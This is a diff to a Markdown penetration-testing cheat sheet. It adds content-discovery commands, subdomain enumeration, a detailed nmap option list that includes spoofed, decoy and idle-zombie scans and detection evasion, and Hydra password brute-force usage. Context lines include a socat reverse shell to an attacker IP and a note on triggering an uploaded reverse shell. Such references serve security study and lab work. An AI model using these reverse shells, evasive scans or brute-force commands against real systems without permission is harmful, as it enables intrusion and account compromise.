@@ -2,11 +2,18 @@
 
 ## Table of Contents
 
-**1. [OtherCheatsheets/Libraries](#other-cheatsheetslibraries)**
+**1. [Other Cheatsheets/Libraries](#1-other-cheatsheetslibraries)**
 
 **2. [General Tools](#2-general-tools)**
 
+* [Tools](#tools)
+* [Wordlists](#wordlists)
+
 **3. [Information Gathering](#3-information-gathering)**
+
+* [useful links](#useful-links)
+* [Tools](#tools-1)
+* [Nmap](#nmap)
 
 **4. [Vulnerability Scanner](#4-vulnerability-scanner)**
 
@@ -27,6 +34,7 @@
 
 **8. [Password/Hash Cracking](#8-passwordhash-cracking)**
 
+* [useful links](#useful-links-1)
 * [Hashcat](#hashcat)
 * [John the Ripper](#john-the-ripper)
 * [Hydra](#hydra)
@@ -53,9 +61,135 @@
 
 ## 2. General Tools:
 
+### Tools
+
 [CyberChef](https://gchq.github.io/CyberChef/)
 
+### Wordlists:
+
+https://github.com/danielmiessler/SecLists
+
 ## 3. Information Gathering:
+
+### useful links:
+
+[OWASP favicon Database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
+
+### Tools:
+
+Content Discovery:
+
+[Wappanalyzer](https://www.wappalyzer.com/)
+
+[Wayback Machine](https://web.archive.org/)
+
+#### ffuf:
+```
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u <url>/FUZZ
+   
+```
+#### dirb:
+```
+dirb <url> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt   
+```
+#### gobuster:
+```
+gobuster dir --url <url> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt   
+```
+
+SSL/TLS Certificates:
+
+https://crt.sh/
+
+https://ui.ctsearch.entrust.com/ui/ctsearchui
+
+
+DNS Bruteforce: 
+```
+dnsrecon   
+```
+Subdomain Enumeration:
+
+[Sublist3r](https://github.com/aboul3la/Sublist3r)
+```
+./sublist3r.py -d <domain>
+```
+
+
+### Nmap:
+```
+nmap <scan_type> <options> <machine_ip/network>
+
+    Scan types:
+        -PR     ARP Scan
+        -PE     ICMP Echo Scan
+        -PP     ICMP Timestamp Scan
+        -PM     ICMP Address Mask Scan
+        -PS     TCP SYN Ping Scan
+        -PA     TCP ACK Ping Scan
+        -PU     UDP Ping Scan
+        
+        -sT     TCP Connect Scan
+        -sS     TCP SYN Scan
+        -sU     UDP Scan
+        
+        -sN     TCP Null Scan
+        -sF     TCP FIN Scan
+        -sX     TCP Xman Scan
+        -sM     TCP Maimon Scan
+        -sA     TCP ACK Scan
+        -sW     TCP Window Scan
+    
+        -S <spoofed_ip> <maching_ip>    Spoofed Source IP
+        --spoof-mac <spoofed_mac>       Spoofed MAC-Address
+        - D <decoy_ip>,me <machine_ip>  Decoy Scan
+        -sI <zombie_ip> <machine_ip>    Idle(Zombie) Scan
+
+    Options:
+        -n      no DNS lookup
+        -R      reverse-DNS lookup for all hosts
+        -sn     host discovery only
+
+        Port Options:
+            -p-                             scans all ports
+            -p                              specify ports to scan
+            -p1-1023                        scan ports 1 to 1023
+            -F                              scan 100 most common ports
+            -r                              scan ports in consecutive order
+            -- source-port <port_number>    specify port number
+
+        Scan Speed/Detection avoidance:
+            -T<0-5>                         adjust speed of port scanning
+            --max-rate <number> rate        <= <number> packets/sec
+            --min-rate <number> rate        >= <number> packets/sec
+            --min-parallelism <number>      at least <number> of probes in parallel
+            -f                              Fragment IP into 8 bytes
+            -ff                             Fragment IP into 16 bytes
+            --data-length <number>          append random data to reach given length
+        
+        Verbosity/General:
+            --reason                explains how nmap made its conclusion
+            -v                      verbose
+            -vv                     very verbose
+            -d                      debugging
+            -dd                     more details for debugging
+            -sV                     service detection
+            -sV --version-light     intensity level 2
+            -sV --version-all       intensity level 9
+            -O                      detect OS
+            --traceroute            run traceroute to target
+            --script=<SCRIPTS>      nmap scripts to run
+            -sC / --script=default  run default scripts
+            -A                      equivalent to -sV -O -sC --traceroute
+
+            Script Categories: https://nmap.org/book/nse-usage.html#nse-category-auth
+
+        Output Options:
+            -oN     save output in normal format
+            -oG     save output in grepable format
+            -oX     save output in XML format
+            -oA     save output in normal,XML and Grepable format
+```
 
 ## 4. Vulnerability Scanner:
 
@@ -144,7 +278,7 @@ unstable version
 
     T-Windows: socat TCP:<attack_ip>:<port_number> EXEC:powershell.exe,pipes
 
-stable(only for Linux Target with socat installed/possibly to upload precompiled binary aswell)
+stable(only for Linux Target with socat installed/possible to upload precompiled binary aswell)
 
     A: socat TCP-L:<port_number> FILE:`tty`,raw,echo=0
 
@@ -239,11 +373,28 @@ need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/
 
 ## 8. Password/Hash Cracking:
 
+### useful links:
+
+https://crackstation.net/
+
 ### Hashcat:
 
 ### John the Ripper:
 
 ### Hydra:
+https://github.com/vanhauser-thc/thc-hydra
+````
+hydra -l <username> -P <wordlist.txt> <server> <service>
+
+    Options:
+        -l                  provide login name
+        -P                  specify password list
+        server service      set server address and service to attack
+        -s <port_number>    use in case of non-default port number of service
+        -V / -vV            show tried username&password combinations
+        -d                  display debugging output
+        -t <number>         specify number of parallel connections (e.g. -t 16)
+````
 
 ## 9. Exfiltration:
 
